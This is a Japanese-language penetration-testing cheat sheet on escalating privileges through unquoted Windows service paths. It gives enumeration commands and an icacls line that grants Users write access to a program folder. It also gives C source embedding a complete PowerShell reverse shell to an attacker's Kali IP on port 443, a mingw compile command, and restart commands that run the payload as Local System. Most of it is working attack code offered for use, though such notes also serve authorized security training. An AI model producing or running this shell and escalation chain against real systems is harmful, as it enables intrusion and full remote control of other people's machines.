# Unquoted Service Path

* 前提条件:通常の権限を持ったユーザで侵入はできていること。
* ユーザが端末の再起動またはサービスの再起動ができること。

## enumeration

* ユーザの権限を確認

``` bat
    whoami /priv
```

* cmdで脆弱性のあるサービスのパスの確認

``` bat
    wmic service get name,pathname,displayname,startmode | findstr /i /v | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

powershellならこっち

```powershell
    Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select Name,DisplayName,StartMode,PathName
```

* サービスの情報を確認
  * START_TYPE: AUTO_START
  * ERROT_CONTROL:NORMAL
  * BINARY_PATH_NAME:
  * SERVICE_START_NAME:Local System

``` bat
    sc qc "<service_name>"
```

* サービスフォルダーの権限の確認
書き込み権限があるかを確認する。

``` bat
    icacls "C:\Program Files\<Forder_name>"

    権限追加
    icacls "C:\Program Files\<Forder_name>" /grant BUILTIN\Users:W
```

## Exploit

* Revearse Shellをとって権限昇格
  * msfvenomでexeファイルを作成して転送
  * 下のcのソースを使ってexeを作成して転送
  * 実行ファイル名は脆弱性を利用できる名前にする。

``` c
    #include <windows.h>
    #include <stdio.h>

    int main(){
        system("powershell.exe -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('<kaliのIP>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"");
        return 0;
    }
```

* コンパイル

``` shell
    #gccでコンパイルするとinclude<windows.h>でエラーが出た
    #使用コマンド
    x86_64-w64-mingw32-gcc XXX.c -o XXX.exe
```

* 転送してファイルを脆弱性のあるフォルダに配置

* サービスの再起動か端末の再起動

``` bat
    #サービス
    sc stop "<service_name>"
    sc start "<service_name>"
    #端末
    shutdown /r /t 0 /f
```
